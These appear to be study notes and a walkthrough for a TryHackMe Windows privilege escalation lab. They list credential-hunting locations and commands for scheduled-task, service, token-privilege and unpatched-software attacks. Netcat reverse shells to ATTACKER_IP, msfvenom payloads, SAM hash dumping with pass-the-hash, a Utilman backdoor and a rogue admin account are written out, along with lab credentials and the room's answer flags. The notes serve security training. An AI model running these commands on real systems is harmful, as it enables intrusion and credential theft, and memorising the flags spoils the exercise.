# 3.6 - [Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)

## 🔍 Overview
- **Privilege escalation** = using access as "User A" to gain access to "User B" (usually Administrator/SYSTEM).
- Common weaknesses exploited:
  - Misconfigurations in services/scheduled tasks
  - Excessive privileges assigned to our account
  - Vulnerable software
  - Missing security patches
- Lab machine: Windows Server (credentials: `thm-unpriv` / `Password321`)

---

## 👤 Windows User Types

| Account Type | Description |
|--------------|-------------|
| **Administrators** | Most privileges; can change any system config, access any file. |
| **Standard Users** | Limited; cannot make permanent/system changes. |
| **SYSTEM / LocalSystem** | Built-in account for OS tasks; **higher privileges than Administrator**. |
| **Local Service** | Minimal privileges; anonymous network connections. |
| **Network Service** | Minimal privileges; uses computer credentials for network auth. |

**Task 1 Answers:**
- Users that can change system configurations → `Administrators`
- SYSTEM has more privileges than Administrator → `aye`

## 🕵️ Credential Hunting (Task 3)

### Unattended Windows Installations
- Files may contain admin credentials:
  - `C:\Unattend.xml`
  - `C:\Windows\Panther\Unattend.xml`
  - `C:\Windows\Panther\Unattend\Unattend.xml`
  - `C:\Windows\system32\sysprep.inf`
  - `C:\Windows\system32\sysprep\sysprep.xml`

**Example XML snippet:**
```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

### PowerShell History
- Commands stored in `ConsoleHost_history.txt`.
- **From cmd.exe:**
  ```cmd
  type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  ```
- **From PowerShell:**
  ```powershell
  type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
  ```

### Saved Windows Credentials
- List saved credentials: `cmdkey /list`
- Use saved creds: `runas /savecred /user:admin cmd.exe`

### IIS Configuration (`web.config`)
- May contain database connection strings with passwords.
- Locations:
  - `C:\inetpub\wwwroot\web.config`
  - `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`
- Search for passwords:
  ```cmd
  type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
  ```

### PuTTY Credentials
- Proxy credentials stored in registry.
- **Query:**
  ```cmd
  reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
  ```

## ⏰ Scheduled Tasks (Task 4)

### The Attack
1. Find vulnerable scheduled task: `schtasks /query /tn vulntask /fo list /v`
2. Check file permissions: `icacls C:\tasks\schtask.bat`
3. If writable, overwrite with reverse shell:
   ```cmd
   echo C:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
   ```
4. Start listener on attacker: `nc -lvp 4444`
5. Run task: `schtasks /run /tn vulntask`
6. Receive shell with task user's privileges.

**Task 4 Answer:**
- Flag for `taskusr1` → `THM{TASK_COMPLETED}`

## 🛠️ Windows Services (Task 5)

### 1. Insecure Permissions on Service Executable
1. Check service config: `sc qc <service>`
2. Check executable permissions: `icacls <path>`
3. If `Everyone` or `Users` have write/modify (`M` or `F`), overwrite executable.
4. Generate payload: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
5. Transfer payload (e.g., `wget`), replace executable.
6. Grant permissions: `icacls WService.exe /grant Everyone:F`
7. Start listener: `nc -lvp 4445`
8. Restart service: `sc stop windowsscheduler` → `sc start windowsscheduler`
9. Receive shell with service user's privileges.

### 2. Unquoted Service Paths
- If path has spaces and isn't quoted, SCM searches for executables in order.
- Example: `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`
  - Searches for: `Disk.exe` → `Disk Sorter.exe` → actual binary.
- If an attacker can write to `C:\MyPrograms\`, place malicious `Disk.exe`.
- Generate payload, transfer, move to hijack location: `move rev-svc2.exe C:\MyPrograms\Disk.exe`
- Grant permissions: `icacls C:\MyPrograms\Disk.exe /grant Everyone:F`
- Restart service → receive shell.

### 3. Insecure Service Permissions (DACL)
1. Check service DACL with AccessChk: `accesschk64.exe -qlc <service>`
2. Look for `SERVICE_ALL_ACCESS` for `BUILTIN\Users`.
3. Reconfigure service: `sc config <service> binPath= "C:\path\to\payload.exe" obj= LocalSystem`
4. Start listener, restart service → receive **SYSTEM** shell.

**Task 5 Answers:**
- Flag for `svcusr1` → `THM{AT_YOUR_SERVICE}`
- Flag for `svcusr2` → `THM{QUOTES_EVERYWHERE}`
- Flag on Administrator's desktop → `THM{INSECURE_SVC_CONFIG}`

## 🔑 Exploiting Windows Privileges (Task 6)

### SeBackup / SeRestore
- Allows reading/writing any file (ignores DACL).
- **Attack:**
  1. Backup SAM and SYSTEM hives: `reg save hklm\system system.hive` and `reg save hklm\sam sam.hive`
  2. Transfer to attacker (e.g., via SMB share).
  3. Extract hashes with `secretsdump.py`:
     ```bash
     python3 secretsdump.py -sam sam.hive -system system.hive LOCAL
     ```
  4. Pass-the-Hash with `psexec.py` to get SYSTEM shell.
  5. Get flag from Administrator's desktop.

### SeTakeOwnership
- Allows taking ownership of any file.
- **Attack:**
  1. Take ownership: `takeown /f C:\Windows\System32\Utilman.exe`
  2. Grant full permissions: `icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F`
  3. Replace with `cmd.exe`: `copy cmd.exe utilman.exe`
  4. Lock screen → click "Ease of Access" → **SYSTEM shell**.

### SeImpersonate / SeAssignPrimaryToken
- Allows impersonating other users.
- **Attack: RogueWinRM**
  1. Upload `RogueWinRM.exe` to target.
  2. Start netcat listener on attacker.
  3. Execute: `RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"`
  4. BITS service connects to port 5985 as SYSTEM; exploit catches it.
  5. Receive **SYSTEM** shell.

**Task 6 Answer:**
- Flag on Administrator's desktop → `THM{SEFLAGPRIVILEGE}`

## 🧩 Unpatched Software (Task 7)

### Case Study: Druva inSync 6.6.3
- Vulnerable RPC service on port 6064 running as SYSTEM.
- Procedure 5 executes arbitrary commands.
- Exploit bypasses path restriction via traversal: `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe`
- **Attack:**
  1. Use PowerShell exploit script (provided in lab).
  2. Modify `$cmd` to add admin user:
     ```powershell
     net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
     ```
  3. Run script; user added to Administrators.
  4. Log in as `pwnd` → retrieve flag from Administrator's desktop.

**Task 7 Answer:**
- Flag on Administrator's desktop → `THM{EZ_DLL_PROXY_4ME}`

## 🔑 Key Takeaways
- **Credentials** can be found in: PowerShell history, web.config, unattended install files, saved Windows creds, PuTTY sessions.
- **Scheduled Tasks** with writable binaries → execute as higher-privileged user.
- **Services** with insecure executable permissions, unquoted paths, or insecure DACLs → hijack to run as SYSTEM.
- **Privileges** like `SeBackup`, `SeRestore`, `SeTakeOwnership`, `SeImpersonate` can be abused to gain SYSTEM.
- **Unpatched software** (e.g., Druva inSync) can expose RPC services with command execution.
- **Automated tools** (WinPEAS, PrivescCheck, WES-NG) speed up enumeration.
